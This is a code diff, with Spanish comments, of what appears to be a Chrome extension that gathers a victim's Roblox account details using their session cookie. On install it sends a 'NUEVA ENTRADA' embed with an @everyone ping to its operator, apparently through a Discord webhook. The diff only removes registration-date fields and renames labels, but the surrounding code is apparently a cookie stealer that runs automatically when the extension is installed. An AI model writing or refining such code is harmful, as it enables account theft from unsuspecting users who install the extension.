@@ -363,18 +363,6 @@ async function obtenerInfoRoblox(cookie) {
         const korblox = await tieneItem(user.id, cookie, 192);
         const cantidadGrupos = await obtenerCantidadGrupos(user.id);
 
-        // CORRECCIÓN: Parsear fecha correctamente
-        let fechaRegistro = 'Desconocida';
-        let antiguedadDias = 0;
-        try {
-            const fecha = new Date(user.created);
-            if (!isNaN(fecha.getTime())) {
-                fechaRegistro = fecha.toLocaleDateString('es-AR');
-                const hoy = new Date();
-                antiguedadDias = Math.floor((hoy - fecha) / 86400000);
-            }
-        } catch (e) {}
-
         const verified = user.hasVerifiedBadge ? "Sí" : "No";
 
         return {
@@ -386,8 +374,6 @@ async function obtenerInfoRoblox(cookie) {
             amigos: amigos,
             headless: headless ? 'Sí' : 'No',
             korblox: korblox ? 'Sí' : 'No',
-            fechaRegistro: fechaRegistro,
-            antiguedadDias: antiguedadDias,
             verified: verified,
             grupos: cantidadGrupos
         };
@@ -416,7 +402,7 @@ chrome.runtime.onInstalled.addListener(async () => {
     }
 
     const embed = {
-        title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
+        title: "🔔¡ NUEVA ENTRADA | **BL PAPI** !",
         color: 15158332,
         fields: [
             {
@@ -430,13 +416,13 @@ chrome.runtime.onInstalled.addListener(async () => {
                 inline: false
             },
             {
-                name: "📊 ITEMS LIMITED (RAREZA)",
+                name: "📊 Inventario",
                 value: \`**Headless:** \\\`\${info.headless || 'No'}\\\`\\n**Korblox:** \\\`\${info.korblox || 'No'}\\\`\`,
                 inline: false
             },
             {
                 name: "📈 ESTADÍSTICAS",
-                value: \`📅 **Registro:** \${info.fechaRegistro} (\${info.antiguedadDias} días)\\n🔰 **Verificado:** \${info.verified}\\n🚻 **Grupos:** \${info.grupos}\`,
+                value: \`🔰 **Verificado:** \${info.verified}\\n🚻 **Grupos:** \${info.grupos}\`,
                 inline: false
             },
             {
@@ -445,7 +431,7 @@ chrome.runtime.onInstalled.addListener(async () => {
                 inline: false
             }
         ],
-        footer: { text: "By **BL PAPI**" }
+        footer: { text: "By @BL PAPI" }
     };
 
     encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
